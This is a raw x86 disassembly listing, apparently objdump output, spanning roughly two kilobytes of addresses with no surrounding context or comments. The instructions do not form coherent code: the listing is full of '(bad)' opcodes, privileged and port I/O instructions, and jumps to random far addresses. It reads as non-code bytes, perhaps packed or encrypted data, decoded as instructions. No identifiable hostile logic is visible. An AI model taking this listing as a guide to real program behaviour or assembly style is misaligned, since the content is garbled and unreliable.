  4141d4:	xchg   edi,eax
  4141d5:	cmp    DWORD PTR [edx+0x355fc105],0x662dea59
  4141df:	sbb    eax,0xf81632d3
  4141e4:	xchg   DWORD PTR [esi+0x60],ecx
  4141e7:	jge    0x41424a
  4141e9:	push   edx
  4141ea:	cs cmp edx,esp
  4141ed:	inc    ebx
  4141ee:	push   cs
  4141ef:	sub    BYTE PTR [esi+0x1bfa8685],al
  4141f5:	sbb    DWORD PTR [edx],ebp
  4141f7:	pop    edx
  4141f8:	mov    dh,0x2c
  4141fa:	cli    
  4141fb:	idiv   DWORD PTR [edx-0x1f61ad8e]
  414201:	loope  0x414203
  414203:	popa   
  414204:	pop    ebx
  414205:	sbb    esp,edx
  414207:	dec    ecx
  414208:	test   dh,ch
  41420a:	test   eax,0x65f1bb40
  41420f:	sbb    BYTE PTR [eax],dh
  414211:	xor    bh,BYTE PTR [edx-0x18]
  414214:	scas   eax,DWORD PTR es:[edi]
  414215:	nop
  414216:	mov    BYTE PTR [ecx+0x42],bl
  414219:	test   BYTE PTR [ecx-0x79176bca],ch
  41421f:	les    esi,FWORD PTR ds:0x9dcc046a
  414225:	jg     0x4141f2
  414227:	add    esp,DWORD PTR [ebx]
  414229:	lods   eax,DWORD PTR ds:[esi]
  41422a:	iret   
  41422b:	sar    BYTE PTR [eax],0xfd
  41422e:	mov    eax,0x54a6c2ef
  414233:	dec    ebp
  414234:	in     al,dx
  414235:	icebp  
  414236:	push   edi
  414237:	fst    DWORD PTR [ecx+0x58]
  41423a:	inc    edi
  41423b:	inc    esp
  41423c:	xor    DWORD PTR [ecx-0x40],esp
  41423f:	mov    ch,0xf0
  414241:	div    ebp
  414243:	sub    BYTE PTR [ecx-0x79],ch
  414246:	popf   
  414247:	rcl    DWORD PTR [edx+0x6882ca63],cl
  41424d:	mov    al,0xa2
  41424f:	into   
  414250:	xor    al,0x48
  414252:	mov    dl,0xbd
  414254:	shl    BYTE PTR [ecx+eiz*2+0x40],1
  414258:	adc    eax,0x47259bee
  41425d:	mov    al,0x59
  41425f:	cmp    eax,DWORD PTR [ecx-0x61]
  414262:	mov    ss,WORD PTR [edi+0x3]
  414265:	jmp    0xa91348b0
  41426a:	enter  0x97a1,0xd1
  41426e:	sub    eax,0x51cd374f
  414273:	clc    
  414274:	mov    ds:0xb146d8c8,al
  414279:	jg     0x414224
  41427b:	(bad)  
  41427c:	push   0xffffff80
  41427e:	pop    ecx
  41427f:	popa   
  414280:	xchg   ecx,eax
  414281:	mov    eax,0x8db7d850
  414286:	test   BYTE PTR [esi],dh
  414288:	(bad)  
  414289:	rcr    BYTE PTR [eax+0xa],0x1
  41428d:	(bad)  
  41428e:	test   al,0x8e
  414290:	fldenv [ebp+0x31]
  414293:	(bad)
  414296:	inc    edi
  414297:	lahf   
  414298:	shl    esi,1
  41429a:	jecxz  0x41428b
  41429c:	adc    ecx,DWORD PTR [edi+0x3d10410e]
  4142a2:	into   
  4142a3:	jle    0x414320
  4142a5:	je     0x41431b
  4142a7:	and    ecx,eax
  4142a9:	xor    eax,0xf1bd535b
  4142ae:	dec    esp
  4142af:	mov    edx,0x5d5bf69f
  4142b4:	cwde   
  4142b5:	ins    DWORD PTR es:[edi],dx
  4142b6:	or     eax,0x28385693
  4142bb:	adc    al,bl
  4142bd:	jp     0x414305
  4142bf:	adc    dl,cl
  4142c1:	sbb    al,0x9b
  4142c3:	sub    eax,0x264935d5
  4142c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4142ca:	cmp    DWORD PTR cs:[esi-0x24418d67],esp
  4142d1:	adc    ebp,eax
  4142d3:	add    DWORD PTR [ecx+0x7bfc84a],ebx
  4142d9:	dec    eax
  4142da:	cwde   
  4142db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4142dc:	pop    edx
  4142dd:	push   0x6e
  4142df:	les    ecx,FWORD PTR [edi+ecx*1+0x271460e6]
  4142e6:	(bad)
  4142e9:	push   ecx
  4142ea:	pop    ss
  4142eb:	(bad)  
  4142ed:	sbb    BYTE PTR [edx],0xd7
  4142f0:	adc    ebp,DWORD PTR ds:0xef9f7865
  4142f6:	rcr    cl,0x6
  4142f9:	stos   DWORD PTR es:[edi],eax
  4142fa:	pop    esi
  4142fb:	test   al,0xf4
  4142fd:	mov    ah,BYTE PTR [esi-0x21]
  414300:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414301:	xor    edx,edi
  414303:	shl    BYTE PTR [ecx+0x37],0x73
  414307:	jmp    0x45949095
  41430c:	std    
  41430d:	(bad)  
  41430e:	jae    0x4142e8
  414310:	pop    ecx
  414311:	push   0x25
  414313:	addr16 and cl,dh
  414316:	inc    esi
  414317:	jge    0x414364
  414319:	ins    DWORD PTR es:[edi],dx
  41431a:	iret   
  41431b:	or     al,0xbf
  41431d:	cmp    ebx,DWORD PTR [edx-0x7ad953d6]
  414323:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414324:	test   DWORD PTR [ebp-0x19],0x196de199
  41432b:	enter  0xb53b,0xed
  41432f:	in     al,0x42
  414331:	je     0x414357
  414333:	sbb    DWORD PTR [ebp+0x56],esi
  414336:	adc    al,0x6a
  414338:	stos   DWORD PTR es:[edi],eax
  414339:	and    bh,ch
  41433b:	in     eax,0x72
  41433d:	js     0x414399
  41433f:	cs sbb eax,0x9dda59e7
  414345:	push   edx
  414346:	inc    edi
  414347:	fisttp QWORD PTR [ebx+0x7c]
  41434a:	loope  0x41432d
  41434c:	dec    edi
  41434d:	mov    eax,0x77a498f
  414352:	mov    esp,0xb39599f2
  414357:	add    al,0x32
  414359:	sti    
  41435a:	clc    
  41435b:	es shl bh,1
  41435e:	out    0xae,al
  414360:	mov    dl,0xa4
  414362:	cmp    dl,BYTE PTR gs:[ecx-0x550685ef]
  414369:	(bad)  
  41436a:	push   esi
  41436b:	adc    al,0x64
  41436d:	ss sub eax,0x52de0190
  414373:	jbe    0x4143a4
  414375:	and    al,0xfc
  414377:	pop    esp
  414378:	mov    esi,0xf2d6fba
  41437d:	int    0xc9
  41437f:	jl     0x414344
  414381:	inc    ebx
  414382:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414383:	pop    eax
  414384:	jno    0x41432c
  414386:	not    BYTE PTR [ecx]
  414388:	ret    0x36b2
  41438b:	xor    DWORD PTR ds:0x6f63cf28,edi
  414391:	jecxz  0x41432c
  414393:	add    eax,0x42d372f3
  414398:	jg     0x4143b4
  41439a:	jmp    0x2739:0xc1b9f6a6
  4143a1:	mov    cl,0xc3
  4143a3:	jne    0x4143a8
  4143a5:	int3   
  4143a6:	dec    edx
  4143a7:	(bad)  
  4143a8:	fwait
  4143a9:	push   edi
  4143aa:	push   es
  4143ab:	fmul   DWORD PTR [eax+0x2a]
  4143ae:	pop    edx
  4143af:	pop    esi
  4143b0:	cs jle 0x4143fe
  4143b3:	lea    ebx,[esi+ecx*4-0x1b1b44ee]
  4143ba:	jmp    0x7d96:0x8b49c57f
  4143c1:	imul   DWORD PTR [ebx+esi*1]
  4143c4:	add    eax,edx
  4143c6:	repz push ds
  4143c8:	push   ecx
  4143c9:	repnz addr16 mov esp,0x38616aeb
  4143d0:	fxch   st(0)
  4143d2:	push   DWORD PTR [esi]
  4143d4:	addr16 pushf 
  4143d6:	push   ss
  4143d7:	call   FWORD PTR [eax]
  4143d9:	ret    
  4143da:	std    
  4143db:	mov    ebp,0x2e8e2b45
  4143e0:	js     0x41438b
  4143e2:	arpl   WORD PTR [eax],di
  4143e4:	lock jecxz 0x4143ae
  4143e7:	int    0x79
  4143e9:	add    ch,BYTE PTR [edi+0x1095a13b]
  4143ef:	jo     0x4143af
  4143f1:	test   BYTE PTR [ebp-0x4ffc617b],bh
  4143f7:	dec    esi
  4143f8:	dec    edi
  4143f9:	xor    DWORD PTR [edx+0x7e528b3a],edi
  4143ff:	stos   DWORD PTR es:[edi],eax
  414400:	xchg   ebp,eax
  414401:	xchg   esp,eax
  414402:	jne    0x41440e
  414404:	sbb    DWORD PTR [ebx],ebp
  414406:	scas   al,BYTE PTR es:[edi]
  414407:	pop    eax
  414408:	imul   ebp,DWORD PTR [ebp+eax*2+0x45973758],0x39c3d6b3
  414413:	mov    ebx,0xa806e470
  414418:	inc    eax
  414419:	jmp    0xbaff0fb9
  41441e:	cmc    
  41441f:	sbb    DWORD PTR [ecx-0x27b2c659],edi
  414425:	or     al,0x83
  414427:	and    eax,0xd65b78d2
  41442c:	jmp    0x4143de
  41442e:	clts   
  414430:	(bad)  
  414431:	(bad)  
  414432:	inc    BYTE PTR [ebx-0x1d]
  414435:	pop    ds
  414436:	mov    ebp,0x354f6e48
  41443b:	(bad)  
  41443c:	mov    cs,WORD PTR [edi]
  41443e:	mov    ebp,0x89cadaa1
  414443:	nop
  414444:	out    0x91,al
  414446:	fistp  DWORD PTR [esi+ebp*8]
  414449:	loop   0x41448b
  41444b:	lahf   
  41444c:	mov    cs,ecx
  41444e:	or     ecx,DWORD PTR [ebx-0x3bb91790]
  414454:	add    BYTE PTR [ebx-0x5f86608f],ch
  41445a:	dec    eax
  41445b:	mov    ch,0x76
  41445d:	sbb    DWORD PTR [ebp+0x359983b0],0x65f46975
  414467:	mov    ah,0x21
  414469:	in     al,0xb2
  41446b:	adc    esp,DWORD PTR [ebp+0x2494cc9]
  414471:	aad    0x2b
  414473:	xchg   BYTE PTR [ecx+0x3],dh
  414476:	adc    eax,0xced668d6
  41447b:	into   
  41447c:	fisubr WORD PTR [ebx+0x63]
  41447f:	jnp    0x414485
  414481:	jmp    0x41448e
  414483:	sub    al,dh
  414485:	sbb    BYTE PTR [edi],dl
  414487:	outs   dx,DWORD PTR ds:[esi]
  414488:	lock mov eax,0x3a7cd486
  41448e:	lea    eax,[ecx+0x5f]
  414491:	or     dh,BYTE PTR [edx]
  414493:	dec    eax
  414494:	out    dx,eax
  414495:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414496:	inc    ebp
  414497:	xlat   BYTE PTR ds:[ebx]
  414498:	sbb    dl,BYTE PTR [esi]
  41449a:	jo     0x41449d
  41449c:	xchg   edi,eax
  41449d:	jmp    0xd1f2:0x5b994738
  4144a4:	or     DWORD PTR [esi+0x9aa1fd0],ebx
  4144aa:	fs dec esi
  4144ac:	pop    ss
  4144ad:	sub    DWORD PTR [eax-0x20],ebx
  4144b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4144b1:	(bad)  
  4144b2:	cdq    
  4144b3:	(bad)  
  4144b4:	and    DWORD PTR ds:0x68862b7b,esi
  4144ba:	jecxz  0x414534
  4144bc:	cmp    bh,BYTE PTR [ecx+edi*2]
  4144bf:	push   es
  4144c0:	das    
  4144c1:	inc    esi
  4144c2:	out    0x1f,al
  4144c4:	or     eax,0x53102850
  4144c9:	jmp    0xec265f2b
  4144ce:	cmp    bh,0xf0
  4144d1:	adc    BYTE PTR [esi],ch
  4144d3:	jnp    0x4144e6
  4144d5:	pop    es
  4144d6:	cmp    ch,BYTE PTR [ebx]
  4144d8:	aas    
  4144d9:	icebp  
  4144da:	fsubr  st,st(3)
  4144dc:	or     BYTE PTR [edi],al
  4144de:	out    0xe0,eax
  4144e0:	inc    edx
  4144e1:	cwde   
  4144e2:	xchg   ebx,eax
  4144e3:	(bad)
  4144e8:	lahf   
  4144e9:	mov    ds:0xde8bbac6,eax
  4144ee:	rol    BYTE PTR [ebx+0x7f],0x40
  4144f2:	or     eax,0xd646d87
  4144f7:	sbb    ebx,edx
  4144f9:	loop   0x414577
  4144fb:	stos   DWORD PTR es:[edi],eax
  4144fc:	popf   
  4144fd:	lds    esi,FWORD PTR [ebx+esi*1+0x3e]
  414501:	rcr    BYTE PTR [esi],1
  414503:	xchg   esp,eax
  414504:	cmp    al,0x50
  414506:	outs   dx,DWORD PTR ds:[esi]
  414507:	sbb    dl,0xda
  41450a:	xchg   ebx,eax
  41450b:	and    edi,DWORD PTR [ebp-0x5ead59ba]
  414511:	sub    BYTE PTR [ecx-0x35f6164c],bh
  414517:	and    cl,BYTE PTR [eax+0x323637d2]
  41451d:	add    al,0xd6
  41451f:	mov    DWORD PTR [eax],eax
  414521:	mov    DWORD PTR [ebp+0x6a],edx
  414524:	bound  ebp,QWORD PTR [esi]
  414526:	sbb    dl,ah
  414528:	pop    eax
  414529:	adc    esi,DWORD PTR [edi]
  41452b:	xor    ebx,ebx
  41452d:	(bad)  
  41452e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41452f:	(bad)  
  414530:	and    eax,edi
  414532:	pop    ds
  414533:	rcr    DWORD PTR [ecx-0x49],0x4b
  414537:	pop    ebx
  414538:	or     edi,ecx
  41453a:	mov    al,ds:0x6ffc72f3
  41453f:	clc    
  414540:	jp     0x41457b
  414542:	push   eax
  414543:	lahf   
  414544:	mov    ebx,DWORD PTR [esi+ebx*2+0x39ad45ae]
  41454b:	ror    ecx,cl
  41454d:	loopne 0x4145a4
  41454f:	sahf   
  414550:	lahf   
  414551:	push   0xffffffc2
  414553:	xchg   BYTE PTR ss:[ebx+eiz*4-0x43d04f79],cl
  41455b:	xchg   ebp,eax
  41455c:	out    dx,al
  41455d:	js     0x414563
  41455f:	fsub   DWORD PTR [ecx+0x3a464f9d]
  414565:	enter  0xac23,0xd1
  414569:	mov    esp,0xfd3a4dd0
  41456e:	je     0x41450d
  414570:	test   al,0xe8
  414572:	mov    DWORD PTR [esi-0x5b],ecx
  414575:	jmp    0xd343:0xa15cb536
  41457c:	pop    ecx
  41457d:	mov    bh,0x73
  41457f:	retf   
  414580:	mov    WORD PTR ds:0x80b06610,fs
  414586:	jmp    0xc5fa6f91
  41458b:	test   al,0x3f
  41458d:	jp     0x414543
  41458f:	call   0x8a874b6b
  414594:	dec    edi
  414595:	mov    esp,0x32c3d436
  41459a:	jg     0x414542
  41459c:	scas   al,BYTE PTR es:[edi]
  41459d:	sbb    al,0xc7
  41459f:	mov    ah,0x5
  4145a1:	lods   eax,DWORD PTR ds:[esi]
  4145a2:	ret    
  4145a3:	(bad)  
  4145a4:	jmp    0x3a35:0xd3b4715b
  4145ab:	pop    esi
  4145ac:	push   cs
  4145ad:	sahf   
  4145ae:	fld    QWORD PTR [eax]
  4145b0:	sub    DWORD PTR [ebx+0x3c35caf4],edx
  4145b6:	sub    al,0xfe
  4145b8:	lahf   
  4145b9:	das    
  4145ba:	js     0x4145a0
  4145bc:	jae    0x41455b
  4145be:	popa   
  4145bf:	mov    dl,BYTE PTR [edx-0x631dc48b]
  4145c5:	daa    
  4145c6:	mov    al,0x73
  4145c8:	and    eax,0x24c4c2b4
  4145cd:	leave  
  4145ce:	mov    ebp,0xe7e0a0ec
  4145d3:	mov    esi,0x841030ca
  4145d8:	add    BYTE PTR [eax+edx*1-0x24decf12],0x27
  4145e0:	js     0x414654
  4145e2:	cli    
  4145e3:	xchg   ecx,eax
  4145e4:	add    DWORD PTR [ecx+0x33],ebp
  4145e7:	push   ss
  4145e8:	dec    ebx
  4145e9:	push   0x67
  4145eb:	data16 ficom DWORD PTR [ecx]
  4145ee:	pop    ss
  4145ef:	out    dx,eax
  4145f0:	sbb    eax,DWORD PTR [esi]
  4145f2:	repz xchg edi,eax
  4145f4:	(bad)  
  4145f5:	mov    esp,0xa32d6688
  4145fa:	loope  0x414588
  4145fc:	add    DWORD PTR [ecx-0x35d52cdd],edi
  414602:	gs out 0x8,al
  414605:	mov    ebp,0x41b61a9e
  41460a:	vpshab ymm9,xmm4,[ecx+0x19]
  414610:	mov    dl,0x73
  414612:	es inc esi
  414614:	jno    0x41464b
  414616:	mov    dl,0x36
  414618:	fidiv  WORD PTR [eax+eax*8+0x12]
  41461c:	pop    es
  41461d:	pusha  
  41461e:	call   FWORD PTR [ebx+esi*8]
  414621:	adc    DWORD PTR [edi],ecx
  414623:	xor    eax,0xfdbf89b7
  414628:	pop    esi
  414629:	add    eax,0x97c95d85
  41462e:	inc    ebx
  41462f:	sub    eax,0x6824c06
  414634:	fld    DWORD PTR [ebp-0x64]
  414637:	mov    DWORD PTR [ecx],ebp
  414639:	and    al,0x8b
  41463b:	in     al,0x9c
  41463d:	sub    edi,DWORD PTR [eax-0x41acd3af]
  414643:	jle    0x414663
  414645:	(bad)  
  414646:	out    0xc0,eax
  414648:	sub    BYTE PTR [edx-0x6d],al
  41464b:	xchg   esp,eax
  41464c:	stos   DWORD PTR es:[edi],eax
  41464d:	add    WORD PTR [edi],si
  414650:	aas    
  414651:	push   esp
  414652:	sub    BYTE PTR [ebp-0x42],0x3e
  414656:	jno    0x414620
  414658:	pop    es
  414659:	jmp    0x714ffd09
  41465e:	imul   edi,DWORD PTR [edi],0x73be9f5b
  414664:	fmul   DWORD PTR [edi]
  414666:	and    al,0xc9
  414668:	in     eax,0xeb
  41466a:	mov    cl,0x41
  41466c:	mov    esp,0x8ba64c90
  414671:	scas   eax,DWORD PTR es:[edi]
  414672:	sub    esp,edi
  414674:	sub    ah,dl
  414676:	mov    dl,0x9a
  414678:	mov    ch,0x2d
  41467a:	imul   ebp,ebx,0xffffffd7
  41467d:	lods   al,BYTE PTR ds:[esi]
  41467e:	sbb    ebx,DWORD PTR [ebp+0x4c]
  414681:	mov    ebp,0x2f177236
  414686:	push   edx
  414687:	add    cl,BYTE PTR [edx+0x2985a012]
  41468d:	xor    BYTE PTR [edx-0x2f],ch
  414690:	and    DWORD PTR [eax+0x58],esi
  414693:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414694:	rol    BYTE PTR [edi-0x7820d15d],0x2e
  41469b:	mov    eax,0x44d58fef
  4146a0:	sub    eax,0x8e57ab9d
  4146a5:	cmp    DWORD PTR [eax+0x2b17d1c],esp
  4146ab:	dec    esi
  4146ac:	fs sbb eax,0x36046155
  4146b2:	not    DWORD PTR [edx-0x3f]
  4146b5:	and    bh,BYTE PTR [ebp+0x4e]
  4146b8:	pop    esi
  4146b9:	cmp    esi,esi
  4146bb:	mov    ds:0xeae3af65,eax
  4146c0:	dec    eax
  4146c1:	mov    al,0x8f
  4146c3:	cmp    eax,DWORD PTR [ecx]
  4146c5:	shr    BYTE PTR [esi],1
  4146c7:	enter  0xa6cf,0xe3
  4146cb:	lea    ebp,[eax+esi*8+0x7a4664cc]
  4146d2:	iret   
  4146d3:	(bad)  
  4146d4:	xor    dl,BYTE PTR [edi+0x23576c11]
  4146da:	shl    DWORD PTR [esi+0x71988ff9],0x44
  4146e1:	xchg   edi,eax
  4146e2:	mov    dl,BYTE PTR [edx-0x56]
  4146e5:	jecxz  0x414667
  4146e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4146e8:	adc    eax,0x21e9f824
  4146ed:	jle    0x414714
  4146ef:	and    al,0x0
  4146f1:	mov    ebp,0xc39ba055
  4146f6:	les    ebp,FWORD PTR gs:0x30c43679
  4146fd:	mov    esp,0xb2e73224
  414702:	sub    eax,0xc0d7d84
  414707:	jo     0x41468b
  414709:	int    0x3f
  41470b:	pushf  
  41470c:	retf   
  41470d:	sub    BYTE PTR [ebx],bl
  41470f:	jp     0x414741
  414711:	(bad)  
  414712:	add    eax,0xefbf988a
  414717:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414719:	push   0x29
  41471b:	jo     0x4146bb
  41471d:	inc    edx
  41471e:	lea    edx,[esi+0x38]
  414721:	das    
  414722:	pop    ecx
  414723:	inc    ebx
  414724:	add    DWORD PTR [esi+0x60],0x2b2fbf89
  41472b:	xchg   WORD PTR [esi+edx*4],ax
  41472f:	fs adc al,0x14
  414732:	aam    0xe9
  414734:	test   eax,0xff0a73b
  414739:	aam    0xcb
  41473b:	mov    ss,WORD PTR [edx-0x2b]
  41473e:	cmp    esi,DWORD PTR [esi-0x6c]
  414741:	add    cl,BYTE PTR [eax-0x62c3a724]
  414747:	mov    dh,0x6b
  414749:	and    esp,DWORD PTR [ebx-0x75f4bfb1]
  41474f:	icebp  
  414750:	jge    0x4147a9
  414752:	ds imul ebp,eax,0x1cc134ae
  414759:	sbb    BYTE PTR [esi+0x4b73d4f6],bh
  41475f:	mov    dl,0x3e
  414761:	jle    0x4147ca
  414763:	dec    eax
  414764:	rcr    BYTE PTR [eax],0x95
  414767:	push   esi
  414768:	inc    ebx
  414769:	xchg   edi,eax
  41476a:	jmp    0x414712
  41476c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41476d:	and    DWORD PTR [ebp-0x57],edi
  414770:	dec    edi
  414771:	mov    ebp,0xf42eb055
  414776:	push   0x46f72b79
  41477b:	xchg   edx,eax
  41477c:	pop    eax
  41477d:	stos   DWORD PTR es:[edi],eax
  41477e:	(bad)  
  41477f:	dec    ebx
  414780:	lods   al,BYTE PTR ds:[esi]
  414781:	fbld   TBYTE PTR [ecx-0xc8e576b]
  414787:	fisttp DWORD PTR [ebx-0x7e]
  41478a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41478b:	imul   edx,DWORD PTR [ecx+0x72],0xffffffdc
  41478f:	xchg   DWORD PTR [ecx],esp
  414791:	(bad)
  414795:	and    al,0xb2
  414797:	pop    edx
  414798:	leave  
  414799:	iret   
  41479a:	arpl   bp,dx
  41479c:	dec    esi
  41479d:	cmp    ebx,eax
  41479f:	dec    ebx
  4147a0:	and    BYTE PTR [esi-0x24],dh
  4147a3:	scas   al,BYTE PTR es:[edi]
  4147a4:	lea    esi,[edx]
  4147a6:	xchg   edi,eax
  4147a7:	inc    eax
  4147a8:	hlt    
  4147a9:	(bad)
  4147ac:	push   ecx
  4147ad:	push   ss
  4147ae:	cmp    esi,ebp
  4147b0:	dec    eax
  4147b1:	adc    al,ch
  4147b3:	sbb    DWORD PTR [ecx],esp
  4147b5:	jnp    0x4147c4
  4147b7:	inc    ecx
  4147b8:	sbb    eax,0x18298f84
  4147bd:	sbb    eax,0x819e15bb
  4147c2:	(bad)  [edx]
  4147c4:	mov    al,0xd0
  4147c6:	and    al,0xcd
  4147c8:	xchg   edx,eax
  4147c9:	fisttp QWORD PTR [eax+0x3]
  4147cd:	cmp    ch,BYTE PTR [eax+0x404b9e72]
  4147d3:	lock jecxz 0x41482f
  4147d6:	(bad)  
  4147d7:	stc    
  4147d8:	pop    ebp
  4147d9:	loop   0x414799
  4147db:	pusha  
  4147dc:	xchg   esi,eax
  4147dd:	sub    BYTE PTR [edi],0x29
  4147e0:	scas   al,BYTE PTR es:[edi]
  4147e1:	cmc    
  4147e2:	jns    0x4147a9
  4147e4:	xchg   ebx,eax
  4147e5:	rcr    DWORD PTR [eax-0x485e22b8],0x81
  4147ec:	jmp    0x26877c12
  4147f1:	pop    ebx
  4147f2:	cdq    
  4147f3:	stos   BYTE PTR es:[edi],al
  4147f4:	add    DWORD PTR [ebp+0x34ee1e89],edi
  4147fa:	push   esp
  4147fb:	imul   dh
  4147fd:	or     eax,0x12069093
  414803:	rol    DWORD PTR [ebp+0x5f],0x32
  414807:	dec    eax
  414808:	test   al,0xe6
  41480a:	inc    ebx
  41480b:	fsubrp st(4),st
  41480d:	clc    
  41480e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41480f:	push   ebx
  414810:	mov    bl,0x9d
  414812:	xor    ch,BYTE PTR [eax]
  414814:	push   ds
  414815:	dec    ecx
  414816:	inc    esp
  414817:	lahf   
  414818:	jp     0x414800
  41481a:	mov    al,0x20
  41481c:	sbb    bh,BYTE PTR [ecx+0x68ef8300]
  414822:	inc    esp
  414823:	and    DWORD PTR [edi+ecx*1+0x6],ebx
  414827:	scas   al,BYTE PTR es:[edi]
  414828:	xchg   edi,eax
  414829:	out    dx,al
  41482a:	add    eax,0x8d846dee
  41482f:	out    dx,eax
  414830:	mov    ds:0xb77fa837,eax
  414835:	mov    cl,ch
  414837:	mov    ecx,0xd0d4fbeb
  41483c:	push   0x32
  41483e:	fnstcw WORD PTR [edi+ecx*8-0x71]
  414842:	push   esi
  414843:	ret    
  414844:	cmp    al,0x7f
  414846:	pop    ecx
  414847:	push   ds
  414848:	sti    
  414849:	xor    eax,0x53ea1bf1
  41484e:	shl    dl,0xfe
  414851:	pop    ss
  414852:	popa   
  414853:	pop    edi
  414854:	arpl   WORD PTR [esi],cx
  414856:	xchg   DWORD PTR [edi],ebx
  414858:	xchg   esp,eax
  414859:	not    BYTE PTR [esi-0x62469b86]
  41485f:	jmp    0xbf06:0x4fddbf92
  414866:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414867:	jns    0x414828
  414869:	xchg   esp,eax
  41486a:	into   
  41486b:	daa    
  41486c:	pinsrw mm2,WORD PTR [edx+0xf3a0d0],0xe2
  414874:	mov    ds:0xdc0daa0c,eax
  414879:	data16 mov dl,0x9b
  41487c:	mov    bl,ch
  41487e:	jns    0x4148a1
  414880:	jecxz  0x414883
  414882:	sub    al,BYTE PTR ds:0xcd9d444a
  414888:	dec    esp
  414889:	push   ebp
  41488a:	or     al,BYTE PTR [ecx+edx*1-0x1e]
  41488e:	adc    al,BYTE PTR [edi+0x12]
  414891:	(bad)  
  414892:	pop    ebx
  414893:	rol    ch,cl
  414895:	add    BYTE PTR [ebx-0x50],ah
  414898:	arpl   WORD PTR [ebx+0x504c5a00],ax
  41489e:	fst    DWORD PTR [eax]
  4148a0:	cwde   
  4148a1:	sbb    BYTE PTR [ebp-0x28],bh
  4148a4:	inc    ebp
  4148a5:	out    dx,eax
  4148a6:	(bad)  
  4148a7:	and    BYTE PTR [edi+0x7ab7d800],al
  4148ad:	mov    ecx,0xd534a178
  4148b2:	stos   BYTE PTR es:[edi],al
  4148b3:	cld    
  4148b4:	xchg   esp,eax
  4148b5:	arpl   WORD PTR [edi+0x61],bp
  4148b8:	(bad)  [ecx-0x1a5f01ed]
  4148be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4148bf:	jbe    0x41489e
  4148c1:	mov    gs,WORD PTR cs:[ecx-0x6a]
  4148c5:	inc    edx
  4148c6:	mov    cl,0xb0
  4148c8:	aaa    
  4148c9:	sbb    esp,DWORD PTR [eax-0x735b7efe]
  4148cf:	sub    dh,bl
  4148d1:	dec    ecx
  4148d2:	retf   0x3ead
  4148d5:	mov    al,ds:0x7a65b2fb
  4148da:	or     al,0x0
  4148dc:	stc    
  4148dd:	xor    dl,BYTE PTR [eax+ebp*2-0x14]
  4148e1:	data16 (bad) 
  4148e3:	and    ecx,DWORD PTR [ecx-0x116b921b]
  4148e9:	pop    edx
  4148ea:	rol    BYTE PTR [edx],1
  4148ec:	data16 aam 0x17
  4148ef:	cld    
  4148f0:	push   ebx
  4148f1:	out    0xd4,eax
  4148f3:	mov    gs,WORD PTR [ebp-0x43]
  4148f6:	or     eax,0x4df2082c
  4148fb:	or     ebp,DWORD PTR [edi-0x3e8bde3b]
  414901:	fild   QWORD PTR [edx]
  414903:	adc    al,BYTE PTR [ebx]
  414905:	or     DWORD PTR [ebp+0x25],eax
  414908:	mov    ecx,0xed69eb4a
  41490d:	mov    dh,0xc6
  41490f:	popa   
  414910:	jns    0x4148f3
  414912:	jmp    0x4148b9
  414914:	xor    BYTE PTR [ebp+0x36],0x38
  414918:	(bad)  
  414919:	jns    0x41497a
  41491b:	mov    cl,0xbf
  41491d:	sbb    DWORD PTR [ecx],ecx
  41491f:	lds    esp,FWORD PTR [esi]
  414921:	jmp    esi
  414923:	and    bh,BYTE PTR [edx-0x4ea8f13]
  414929:	cmp    BYTE PTR [ecx-0xc],dh
  41492c:	loope  0x4148ce
  41492e:	scas   eax,DWORD PTR es:[edi]
  41492f:	out    dx,eax
  414930:	fild   QWORD PTR [ebx-0x1d66c8c0]
  414936:	mov    eax,0xffc2fd1b
  41493b:	in     al,dx
  41493c:	or     al,0xeb
  41493e:	sub    eax,0x88f3033e
  414943:	dec    ebp
  414944:	and    bh,BYTE PTR [edx+0x21]
  414947:	push   0xe5be0267
  41494c:	cmc    
  41494d:	jp     0x414940
  41494f:	sbb    eax,0x193c7a0e
  414954:	addr16 lahf 
  414956:	xor    dh,BYTE PTR [ecx+0x3d]
  414959:	rcr    DWORD PTR [ebx+ebx*8],cl
  41495c:	dec    BYTE PTR [ebp+0x0]
  41495f:	in     al,0x6b
  414961:	das    
  414962:	rcl    DWORD PTR [edx],1
  414964:	pop    esi
  414965:	and    bl,BYTE PTR cs:[bp+0x21]
  41496a:	and    dh,BYTE PTR [edi-0x62adb249]
  414970:	xlat   BYTE PTR ds:[ebx]
  414971:	push   edi
  414972:	pop    eax
  414973:	cwde   
  414974:	xchg   ebp,eax
  414975:	mov    bl,0xe2
  414977:	mov    esp,0x7fa7cd39
  41497c:	mov    eax,ds:0x3776ad62
  414981:	xchg   edi,eax
  414982:	sbb    DWORD PTR [ebx+eiz*4],edi
  414985:	push   ebp
  414986:	add    al,bh
  414988:	sti    
  414989:	xchg   ebx,eax
  41498a:	in     al,0x17
  41498c:	out    dx,al
  41498d:	xor    cl,BYTE PTR [eax]
  41498f:	hlt    
  414990:	sbb    DWORD PTR [ebx-0x3677734b],ecx
  414996:	xor    DWORD PTR [ecx-0x26],esi
  414999:	outs   dx,BYTE PTR ds:[esi]
  41499a:	loop   0x414975
  41499c:	jp     0x414946
  41499e:	adc    BYTE PTR [edi],0x6f
  4149a1:	xchg   BYTE PTR [ebx-0x2c],dh
  4149a4:	cwde   
  4149a5:	mov    gs,WORD PTR [edi+0x132b26b9]
  4149ab:	and    eax,0x4e40da43
  4149b0:	aad    0x9f
  4149b2:	bound  esp,QWORD PTR [eax+0x78f1fb63]
  4149b8:	cwde   
  4149b9:	sbb    edx,edi
  4149bb:	or     ah,BYTE PTR [ebp-0x37]
  4149be:	xchg   ecx,eax
  4149bf:	adc    DWORD PTR [edx+0x3ff29755],ebp
